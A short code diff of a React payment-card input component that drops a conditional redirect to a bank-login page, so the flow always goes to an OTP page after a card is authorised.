@@ -197,12 +197,8 @@ const PaymentCardInput = () => {
       description: "تم تفويض البطاقة بنجاح",
     });
     
-    // Navigate to bank login page if bank is selected, otherwise go to OTP
-    if (selectedBankId && selectedBankId !== 'skipped') {
-      navigate(`/pay/${id}/bank-login`);
-    } else {
-      navigate(`/pay/${id}/otp`);
-    }
+    // Card direct flow: always go to OTP after card input
+    navigate(`/pay/${id}/otp`);
   };
   
   return (
